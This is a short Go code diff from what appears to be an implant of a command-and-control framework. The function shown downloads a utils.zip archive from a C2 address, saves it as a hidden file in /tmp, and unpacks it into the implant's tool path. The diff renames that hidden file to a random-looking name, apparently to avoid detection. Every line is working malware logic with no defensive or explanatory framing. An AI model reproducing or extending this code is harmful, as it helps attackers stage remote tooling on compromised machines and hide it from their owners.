@@ -12,7 +12,7 @@ import (
 
 func installUtils() string {
 	log.Printf("Downloading utils.zip from %s", CCAddress+"utils.zip")
-	err := Download(CCAddress+"utils.zip", "/tmp/.slnvs")
+	err := Download(CCAddress+"utils.zip", "/tmp/.vj8x8Verd")
 	out := "[+] Utils have been successfully installed"
 	if err != nil {
 		log.Print("Utils error: " + err.Error())
@@ -20,7 +20,7 @@ func installUtils() string {
 	}
 
 	// TODO unpack utils.zip to our PATH
-	if err = archiver.Unarchive("/tmp/.slnvs", UtilsPath); err != nil {
+	if err = archiver.Unarchive("/tmp/.vj8x8Verd", UtilsPath); err != nil {
 		log.Printf("Unarchive: %v", err)
 	}
 	return out
